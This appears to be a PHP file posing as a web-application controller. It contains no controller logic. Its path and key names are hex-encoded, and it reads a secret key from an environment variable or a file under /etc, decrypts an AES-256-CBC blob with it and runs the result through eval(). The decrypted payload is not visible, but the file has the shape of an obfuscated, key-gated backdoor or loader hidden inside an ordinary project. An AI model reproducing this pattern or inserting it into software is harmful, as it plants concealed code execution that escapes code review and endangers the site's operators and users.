<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('S7klHi3zkpDvmi6Bjh6hVQ==');

$c=base64_decode(

'4GGwWMH43no7Ci0xjLWvqWIOlS4KJ8LGZm4zMURlxmQqTbxPnhoV79aGWIMYR5BWZcIAZtT3lH3m' .
'IwZZ8tgYZuAxIzE8a+iSUfaOncjL1q0F240ynmfY6FMM3NEovANUlVpzkge3hyQLniiR5PQOBmyT' .
'LqGYv5nbP8CrWgmEAjRumU+fv7cBFLkOQxNSIjE8ZfnJTQLG3VM3cnQF+f44Uw23K/5an4GrgPcw' .
'FV8mXgR+Adr4wkc4qOrH8bsn/Muj1QYIgoBJL6M8fnFnstTPyw+eINqC1DxB5DC3ftTNugXUuMSF' .
'2xh4d1wIeSIidC14D/rmFWwYGPA8h9FHjet5LoQArd39tgkAQRExF1Fm+wqAjkq54hxDAjczjdVi' .
'TZl0uonQb7D6+ay5bficrJ/yHA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

